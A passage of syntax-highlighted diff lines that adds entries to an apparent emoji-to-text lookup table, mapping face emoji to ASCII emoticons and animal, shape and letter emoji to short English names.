+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😊&#34;</span><span class=p>:</span> <span class=s2>&#34;:)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😋&#34;</span><span class=p>:</span> <span class=s2>&#34;:P&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😎&#34;</span><span class=p>:</span> <span class=s2>&#34;B)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😍&#34;</span><span class=p>:</span> <span class=s2>&#34;:)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😘&#34;</span><span class=p>:</span> <span class=s2>&#34;:*&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😗&#34;</span><span class=p>:</span> <span class=s2>&#34;:*&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😙&#34;</span><span class=p>:</span> <span class=s2>&#34;:*&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😚&#34;</span><span class=p>:</span> <span class=s2>&#34;:*&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;☺️&#34;</span><span class=p>:</span> <span class=s2>&#34;:)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🙂&#34;</span><span class=p>:</span> <span class=s2>&#34;:)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤗&#34;</span><span class=p>:</span> <span class=s2>&#34;:)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤩&#34;</span><span class=p>:</span> <span class=s2>&#34;:)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤔&#34;</span><span class=p>:</span> <span class=s2>&#34;:?&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤨&#34;</span><span class=p>:</span> <span class=s2>&#34;:/&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😐&#34;</span><span class=p>:</span> <span class=s2>&#34;:|&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😑&#34;</span><span class=p>:</span> <span class=s2>&#34;:|&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😶&#34;</span><span class=p>:</span> <span class=s2>&#34;:|&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🙄&#34;</span><span class=p>:</span> <span class=s2>&#34;:/&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😏&#34;</span><span class=p>:</span> <span class=s2>&#34;:]&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😣&#34;</span><span class=p>:</span> <span class=s2>&#34;&gt;:&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😥&#34;</span><span class=p>:</span> <span class=s2>&#34;:&#39;(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😮&#34;</span><span class=p>:</span> <span class=s2>&#34;:o&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤐&#34;</span><span class=p>:</span> <span class=s2>&#34;:x&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😯&#34;</span><span class=p>:</span> <span class=s2>&#34;:o&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😪&#34;</span><span class=p>:</span> <span class=s2>&#34;:&#39;(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😫&#34;</span><span class=p>:</span> <span class=s2>&#34;&gt;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😴&#34;</span><span class=p>:</span> <span class=s2>&#34;Zzz&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😌&#34;</span><span class=p>:</span> <span class=s2>&#34;:)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😛&#34;</span><span class=p>:</span> <span class=s2>&#34;:P&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😜&#34;</span><span class=p>:</span> <span class=s2>&#34;;P&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😝&#34;</span><span class=p>:</span> <span class=s2>&#34;XP&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤤&#34;</span><span class=p>:</span> <span class=s2>&#34;:P&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😒&#34;</span><span class=p>:</span> <span class=s2>&#34;:/&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😓&#34;</span><span class=p>:</span> <span class=s2>&#34;;/&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😔&#34;</span><span class=p>:</span> <span class=s2>&#34;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😕&#34;</span><span class=p>:</span> <span class=s2>&#34;:/&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🙃&#34;</span><span class=p>:</span> <span class=s2>&#34;(:&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤑&#34;</span><span class=p>:</span> <span class=s2>&#34;$)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😲&#34;</span><span class=p>:</span> <span class=s2>&#34;:O&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;☹️&#34;</span><span class=p>:</span> <span class=s2>&#34;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🙁&#34;</span><span class=p>:</span> <span class=s2>&#34;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😖&#34;</span><span class=p>:</span> <span class=s2>&#34;&gt;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😞&#34;</span><span class=p>:</span> <span class=s2>&#34;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😟&#34;</span><span class=p>:</span> <span class=s2>&#34;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😤&#34;</span><span class=p>:</span> <span class=s2>&#34;&gt;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😢&#34;</span><span class=p>:</span> <span class=s2>&#34;:&#39;(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😭&#34;</span><span class=p>:</span> <span class=s2>&#34;:&#39;(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😦&#34;</span><span class=p>:</span> <span class=s2>&#34;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😧&#34;</span><span class=p>:</span> <span class=s2>&#34;&gt;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😨&#34;</span><span class=p>:</span> <span class=s2>&#34;:O&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😩&#34;</span><span class=p>:</span> <span class=s2>&#34;&gt;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤯&#34;</span><span class=p>:</span> <span class=s2>&#34;:O&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😬&#34;</span><span class=p>:</span> <span class=s2>&#34;:E&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😰&#34;</span><span class=p>:</span> <span class=s2>&#34;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😱&#34;</span><span class=p>:</span> <span class=s2>&#34;:O&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🥵&#34;</span><span class=p>:</span> <span class=s2>&#34;&gt;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🥶&#34;</span><span class=p>:</span> <span class=s2>&#34;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😳&#34;</span><span class=p>:</span> <span class=s2>&#34;:$&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤪&#34;</span><span class=p>:</span> <span class=s2>&#34;:P&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😵&#34;</span><span class=p>:</span> <span class=s2>&#34;X(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🥴&#34;</span><span class=p>:</span> <span class=s2>&#34;:P&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😠&#34;</span><span class=p>:</span> <span class=s2>&#34;&gt;:(，&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😡&#34;</span><span class=p>:</span> <span class=s2>&#34;&gt;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤬&#34;</span><span class=p>:</span> <span class=s2>&#34;#$%&amp;!&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤕&#34;</span><span class=p>:</span> <span class=s2>&#34;:(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤢&#34;</span><span class=p>:</span> <span class=s2>&#34;X(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤮&#34;</span><span class=p>:</span> <span class=s2>&#34;:P&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤧&#34;</span><span class=p>:</span> <span class=s2>&#34;:&#39;(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;😇&#34;</span><span class=p>:</span> <span class=s2>&#34;O:)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🥳&#34;</span><span class=p>:</span> <span class=s2>&#34;:D&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🥺&#34;</span><span class=p>:</span> <span class=s2>&#34;:&#39;(&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤡&#34;</span><span class=p>:</span> <span class=s2>&#34;:o)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤠&#34;</span><span class=p>:</span> <span class=s2>&#34;Y)&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤥&#34;</span><span class=p>:</span> <span class=s2>&#34;:L&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤫&#34;</span><span class=p>:</span> <span class=s2>&#34;:x&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🤭&#34;</span><span class=p>:</span> <span class=s2>&#34;:x&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐶&#34;</span><span class=p>:</span> <span class=s2>&#34;dog&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐱&#34;</span><span class=p>:</span> <span class=s2>&#34;cat&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐭&#34;</span><span class=p>:</span> <span class=s2>&#34;mouse&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐹&#34;</span><span class=p>:</span> <span class=s2>&#34;hamster&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐰&#34;</span><span class=p>:</span> <span class=s2>&#34;rabbit&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦊&#34;</span><span class=p>:</span> <span class=s2>&#34;fox&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐻&#34;</span><span class=p>:</span> <span class=s2>&#34;bear&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐼&#34;</span><span class=p>:</span> <span class=s2>&#34;panda&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐨&#34;</span><span class=p>:</span> <span class=s2>&#34;koala&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐯&#34;</span><span class=p>:</span> <span class=s2>&#34;tiger&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦁&#34;</span><span class=p>:</span> <span class=s2>&#34;lion&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐮&#34;</span><span class=p>:</span> <span class=s2>&#34;cow&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐷&#34;</span><span class=p>:</span> <span class=s2>&#34;pig&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐽&#34;</span><span class=p>:</span> <span class=s2>&#34;pig nose&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐸&#34;</span><span class=p>:</span> <span class=s2>&#34;frog&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐒&#34;</span><span class=p>:</span> <span class=s2>&#34;monkey&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐔&#34;</span><span class=p>:</span> <span class=s2>&#34;chicken&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐧&#34;</span><span class=p>:</span> <span class=s2>&#34;penguin&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐦&#34;</span><span class=p>:</span> <span class=s2>&#34;bird&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐤&#34;</span><span class=p>:</span> <span class=s2>&#34;baby chick&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐣&#34;</span><span class=p>:</span> <span class=s2>&#34;hatching chick&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐥&#34;</span><span class=p>:</span> <span class=s2>&#34;front-facing baby chick&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦆&#34;</span><span class=p>:</span> <span class=s2>&#34;duck&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦅&#34;</span><span class=p>:</span> <span class=s2>&#34;eagle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦉&#34;</span><span class=p>:</span> <span class=s2>&#34;owl&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦇&#34;</span><span class=p>:</span> <span class=s2>&#34;bat&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐺&#34;</span><span class=p>:</span> <span class=s2>&#34;wolf&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐗&#34;</span><span class=p>:</span> <span class=s2>&#34;boar&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐴&#34;</span><span class=p>:</span> <span class=s2>&#34;horse&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦄&#34;</span><span class=p>:</span> <span class=s2>&#34;unicorn&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐝&#34;</span><span class=p>:</span> <span class=s2>&#34;bee&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐛&#34;</span><span class=p>:</span> <span class=s2>&#34;bug&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦋&#34;</span><span class=p>:</span> <span class=s2>&#34;butterfly&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐌&#34;</span><span class=p>:</span> <span class=s2>&#34;snail&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐞&#34;</span><span class=p>:</span> <span class=s2>&#34;lady beetle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐜&#34;</span><span class=p>:</span> <span class=s2>&#34;ant&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦟&#34;</span><span class=p>:</span> <span class=s2>&#34;mosquito&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦗&#34;</span><span class=p>:</span> <span class=s2>&#34;cricket&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🕷️&#34;</span><span class=p>:</span> <span class=s2>&#34;spider&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🕸️&#34;</span><span class=p>:</span> <span class=s2>&#34;spider web&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦂&#34;</span><span class=p>:</span> <span class=s2>&#34;scorpion&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐢&#34;</span><span class=p>:</span> <span class=s2>&#34;turtle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐍&#34;</span><span class=p>:</span> <span class=s2>&#34;python&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦎&#34;</span><span class=p>:</span> <span class=s2>&#34;lizard&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦖&#34;</span><span class=p>:</span> <span class=s2>&#34;T-Rex&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦕&#34;</span><span class=p>:</span> <span class=s2>&#34;sauropod&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐙&#34;</span><span class=p>:</span> <span class=s2>&#34;octopus&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦑&#34;</span><span class=p>:</span> <span class=s2>&#34;squid&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦐&#34;</span><span class=p>:</span> <span class=s2>&#34;shrimp&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦞&#34;</span><span class=p>:</span> <span class=s2>&#34;lobster&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦀&#34;</span><span class=p>:</span> <span class=s2>&#34;crab&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐡&#34;</span><span class=p>:</span> <span class=s2>&#34;blowfish&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐠&#34;</span><span class=p>:</span> <span class=s2>&#34;tropical fish&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐟&#34;</span><span class=p>:</span> <span class=s2>&#34;fish&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐬&#34;</span><span class=p>:</span> <span class=s2>&#34;dolphin&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐳&#34;</span><span class=p>:</span> <span class=s2>&#34;whale&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐋&#34;</span><span class=p>:</span> <span class=s2>&#34;whale&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦈&#34;</span><span class=p>:</span> <span class=s2>&#34;shark&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐊&#34;</span><span class=p>:</span> <span class=s2>&#34;crocodile&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐅&#34;</span><span class=p>:</span> <span class=s2>&#34;tiger&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐆&#34;</span><span class=p>:</span> <span class=s2>&#34;leopard&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦓&#34;</span><span class=p>:</span> <span class=s2>&#34;zebra&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦍&#34;</span><span class=p>:</span> <span class=s2>&#34;gorilla&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦧&#34;</span><span class=p>:</span> <span class=s2>&#34;orangutan&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦣&#34;</span><span class=p>:</span> <span class=s2>&#34;mammoth&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐘&#34;</span><span class=p>:</span> <span class=s2>&#34;elephant&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦛&#34;</span><span class=p>:</span> <span class=s2>&#34;hippopotamus&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦏&#34;</span><span class=p>:</span> <span class=s2>&#34;rhinoceros&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐪&#34;</span><span class=p>:</span> <span class=s2>&#34;camel&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐫&#34;</span><span class=p>:</span> <span class=s2>&#34;two-hump camel&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦒&#34;</span><span class=p>:</span> <span class=s2>&#34;giraffe&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦘&#34;</span><span class=p>:</span> <span class=s2>&#34;kangaroo&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦬&#34;</span><span class=p>:</span> <span class=s2>&#34;bison&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦥&#34;</span><span class=p>:</span> <span class=s2>&#34;sloth&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦦&#34;</span><span class=p>:</span> <span class=s2>&#34;otter&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦨&#34;</span><span class=p>:</span> <span class=s2>&#34;skunk&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🦡&#34;</span><span class=p>:</span> <span class=s2>&#34;badger&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🐾&#34;</span><span class=p>:</span> <span class=s2>&#34;paw prints&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;◼️&#34;</span><span class=p>:</span> <span class=s2>&#34;black square&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;◻️&#34;</span><span class=p>:</span> <span class=s2>&#34;white square&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;◾&#34;</span><span class=p>:</span> <span class=s2>&#34;black medium square&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;◽&#34;</span><span class=p>:</span> <span class=s2>&#34;white medium square&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;▪️&#34;</span><span class=p>:</span> <span class=s2>&#34;black small square&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;▫️&#34;</span><span class=p>:</span> <span class=s2>&#34;white small square&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🔶&#34;</span><span class=p>:</span> <span class=s2>&#34;large orange diamond&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🔷&#34;</span><span class=p>:</span> <span class=s2>&#34;large blue diamond&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🔸&#34;</span><span class=p>:</span> <span class=s2>&#34;small orange diamond&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🔹&#34;</span><span class=p>:</span> <span class=s2>&#34;small blue diamond&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🔺&#34;</span><span class=p>:</span> <span class=s2>&#34;triangle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🔻&#34;</span><span class=p>:</span> <span class=s2>&#34;triangle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🔼&#34;</span><span class=p>:</span> <span class=s2>&#34;triangle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🔽&#34;</span><span class=p>:</span> <span class=s2>&#34;triangle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🔘&#34;</span><span class=p>:</span> <span class=s2>&#34;circle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;⚪&#34;</span><span class=p>:</span> <span class=s2>&#34;circle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;⚫&#34;</span><span class=p>:</span> <span class=s2>&#34;black circle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🟠&#34;</span><span class=p>:</span> <span class=s2>&#34;orange circle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🟢&#34;</span><span class=p>:</span> <span class=s2>&#34;green circle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🔵&#34;</span><span class=p>:</span> <span class=s2>&#34;blue circle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🟣&#34;</span><span class=p>:</span> <span class=s2>&#34;purple circle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🟡&#34;</span><span class=p>:</span> <span class=s2>&#34;yellow circle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🟤&#34;</span><span class=p>:</span> <span class=s2>&#34;brown circle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;⭕&#34;</span><span class=p>:</span> <span class=s2>&#34;empty circle&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🅰️&#34;</span><span class=p>:</span> <span class=s2>&#34;A&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🅱️&#34;</span><span class=p>:</span> <span class=s2>&#34;B&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🅾️&#34;</span><span class=p>:</span> <span class=s2>&#34;O&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;ℹ️&#34;</span><span class=p>:</span> <span class=s2>&#34;i&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🅿️&#34;</span><span class=p>:</span> <span class=s2>&#34;P&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Ⓜ️&#34;</span><span class=p>:</span> <span class=s2>&#34;M&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🆎&#34;</span><span class=p>:</span> <span class=s2>&#34;AB&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🆑&#34;</span><span class=p>:</span> <span class=s2>&#34;CL&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🆒&#34;</span><span class=p>:</span> <span class=s2>&#34;COOL&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🆓&#34;</span><span class=p>:</span> <span class=s2>&#34;FREE&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🆔&#34;</span><span class=p>:</span> <span class=s2>&#34;ID&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;🆕&#34;</span><span class=p>:</span> <span class=s2>&#34;NEW&#34;</span><span class=p>,</span>
